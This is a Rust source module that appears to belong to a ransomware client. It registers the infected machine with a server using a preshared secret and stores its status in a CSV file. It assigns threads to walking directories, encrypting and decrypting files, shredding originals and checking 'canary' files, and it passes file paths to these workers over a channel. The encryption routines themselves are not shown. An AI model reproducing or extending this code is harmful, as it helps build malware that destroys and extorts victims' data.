use flume::Receiver;
use log::{debug, error, warn};
use std::{
    path::{Path, PathBuf},
    sync::Arc,
    thread::available_parallelism,
};

use crate::{
    canary::canary_active,
    comm::{ServerConn, register},
    config,
    status::{Status, create_status, export_status_csv, import_status_csv},
};

pub fn initialize_client(
    exe_path_dir: &Path,
    conn: &ServerConn,
    preshared_secret: &str,
) -> Result<Status, String> {
    let existing = import_status_csv(exe_path_dir).map_err(|error| {
        error!("Corrupt status CSV, cannot continue: {error}");
        error
    })?;
    if let Some(csv) = existing {
        debug!("Successfully imported status");
        return Ok(csv);
    }
    warn!("Existing status not imported");
    let new_status = create_status();
    register(conn, &new_status, preshared_secret).map_err(|error| {
        error!("Failed to register with server - cannot continue: {error}");
        error
    })?;
    export_status_csv(exe_path_dir, &new_status).map_err(|error| {
        error!("Failed to export status - cannot continue: {error}");
        error
    })?;
    debug!("Created new status");
    Ok(new_status)
}

#[derive(Clone, Debug)]
pub struct ThreadCounts {
    pub walk: usize,
    pub shred: usize,
    pub encrypt: usize,
    pub decrypt: usize,
    pub canary: usize,
}

pub fn get_thread_counts() -> ThreadCounts {
    let thread_count = match available_parallelism() {
        Ok(suggested) => {
            debug!("Successfully got suggested number of threads: {suggested}");
            suggested.get()
        }
        Err(error) => {
            error!("Failed to get suggested number of threads: {error}");
            1
        }
    };

    let canary_active = canary_active();
    let shred_active = !config::ANALYZE_MODE;

    let walk_count = if thread_count >= 4 {
        (thread_count / 4).max(2)
    } else {
        1
    };
    let canary_count = if canary_active {
        (thread_count / 6).max(1)
    } else {
        0
    };
    let shred_count = if shred_active {
        (thread_count / 6).max(1)
    } else {
        0
    };

    let encrypt_count = thread_count
        .saturating_sub(walk_count + canary_count + shred_count)
        .max(1);

    let decrypt_count = thread_count.saturating_sub(walk_count).max(1);

    debug!(
        "Using {walk_count} walk, {canary_count} canary, {encrypt_count} encrypt, {shred_count} shred, {decrypt_count} decrypt"
    );

    ThreadCounts {
        walk: walk_count,
        shred: shred_count,
        encrypt: encrypt_count,
        decrypt: decrypt_count,
        canary: canary_count,
    }
}

pub fn channel_capacity(consumers: usize) -> usize {
    (consumers * 2).max(64)
}

pub fn recv_path(receiver: &Receiver<Arc<PathBuf>>) -> Option<Arc<PathBuf>> {
    match receiver.recv() {
        Ok(path) => {
            debug!("Received file path over channel: {path:?}");
            Some(path)
        }
        Err(error) => {
            debug!("Channel closed, worker exiting: {error}");
            None
        }
    }
}
